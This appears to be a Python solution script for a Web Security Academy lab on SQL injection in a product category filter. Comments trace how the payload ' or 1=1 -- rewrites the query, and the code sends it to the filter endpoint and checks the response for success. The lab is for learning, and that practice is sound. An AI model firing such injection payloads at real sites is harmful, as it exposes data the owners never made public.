#  SQL injection - product category filter 

#  SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

#  End goal: display all products both released and unreleased 

#  Analysis:

#  SELECT * FROM products WHERE category = 'Pets' AND released = 1 

#  SELECT * FROM products WHERE category = ''' AND released = 1 

#  SELECT * FROM products WHERE category = ''--' AND released = 1

#  SELECT * FROM products WHERE category = ''

#  SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = "/filter?category="
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s wwww.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
        
if exploit_sqli(url, payload):
    print("[+] SQL injection successful!")
else:
    print("[-] SQL injection unsuccessful!")
    
#python sqli-lab-01.py https://ac2e1fbd1eadf724c0d0060800e600c5.web-security-academy.net "' or 1=1 --"
